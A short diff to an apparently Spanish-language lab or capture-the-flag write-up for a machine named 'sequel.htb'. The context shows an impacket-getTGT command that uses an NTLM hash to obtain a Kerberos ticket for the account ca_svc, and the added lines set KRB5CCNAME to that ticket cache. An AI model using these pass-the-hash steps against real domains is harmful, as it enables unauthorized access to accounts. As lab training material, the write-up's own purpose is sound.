@@ -324,3 +324,8 @@ Obtenemos el TGT con [[IMPACKET]]
 impacket-getTGT sequel.htb/ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.232.128
 ```
 
+Guardamos la salida en una variable de entrono
+```shell
+export KRB5CCNAME=ca_svc.ccache
+```
+
